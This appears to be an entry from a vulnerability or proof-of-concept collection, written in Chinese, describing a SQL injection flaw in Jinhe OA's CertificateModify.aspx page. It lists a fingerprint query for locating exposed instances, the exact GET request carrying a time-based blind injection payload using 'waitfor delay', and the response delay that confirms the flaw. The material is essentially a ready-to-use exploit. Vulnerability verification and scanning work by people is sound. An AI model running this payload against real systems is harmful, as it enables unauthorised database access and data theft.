# 金和OACertificateModify存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`GET /c6/Jhsoft.Web.Certificate/CertificateModify.aspx/?ID=1'waitfor delay '0:0:4'-- HTTP/1.1`
- **响应特征**：200 响应时间>=4s